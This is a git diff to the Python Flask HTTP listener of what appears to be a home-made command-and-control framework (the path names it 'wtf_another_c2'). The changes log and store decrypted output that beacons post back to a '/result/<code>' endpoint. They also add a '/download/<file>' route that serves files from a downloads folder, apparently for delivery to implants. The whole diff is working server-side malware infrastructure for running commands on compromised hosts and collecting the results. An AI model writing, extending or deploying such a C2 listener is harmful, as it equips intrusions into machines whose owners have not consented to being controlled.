@@ -1,14 +1,15 @@
 import sys
-import os
 import threading
 
 # from core.stash import *
+from io import BytesIO
 from core.logger import *
 from core.crypto import *
 from random import choice
 from string import ascii_letters
 from multiprocessing import Process
-from flask import Flask, render_template, request
+from os import path, getcwd
+from flask import Flask, render_template, request, send_from_directory
 
 class HTTP_listener:
 
@@ -18,6 +19,7 @@ class HTTP_listener:
         self.port = port
 
         self.stash = stash
+        self.filePath = path.join(getcwd(), 'downloads')
 
         key = self.stash.get_key(name)
         if key:
@@ -27,7 +29,7 @@ class HTTP_listener:
             self.stash.sql_stash( '''INSERT INTO key_store(enc_key, list_name) VALUES( ?, ? )''', (self.key, name) )
 
         ## to fix - get auto folder you idiot
-        html_fold = '/home/blu/Documents/projectz/wtf_another_c2/core/html/'
+        html_fold = path.join(getcwd(), 'core' ,'html')
         self.app = Flask(__name__, template_folder=html_fold)
 
         self.running = True
@@ -68,19 +70,23 @@ class HTTP_listener:
         
         @self.app.route('/result/<code>', methods=['POST'])
         def ret_res(code):
-            # com_code = flask.request.form.get('code')
             if self.stash.check_code(code):
                 enc_result = request.form.get('result')
                 result = DECRYPT(enc_result, self.key)
-
-                # decrypt first base64url.decrypt(IV+encrypted)
-                # success(f'Beacon {name} -> {result}')
-
-                # returning a new encryption key!
-                print(result)
+                success(f'Beacon {name} -> {result}')
+                # self.stash.sql_stash( '''INSERT INTO commands_history(output) VALUES( ? ) WHERE command_code = ? ;''', (result, code) )
+                self.stash.sql_stash( '''UPDATE commands_history SET output = ? WHERE command_code = ? ;''', (result, code) )
                 return ('', 204)
             else:
                 error(f'Command Code {code} not found!')
+                return (render_template(f'404.html', title = '404'), 404)
+
+        @self.app.route('/download/<file>', methods=['GET'])
+        def download(file):
+            print(path.join(self.filePath, file))
+            if path.isfile(path.join(self.filePath, file)):
+                return (send_from_directory(self.filePath, file, as_attachment=True), 200)
+            else:
                 return (render_template(f'404.html', title = '404'), 404)
 
         @self.app.errorhandler(404)
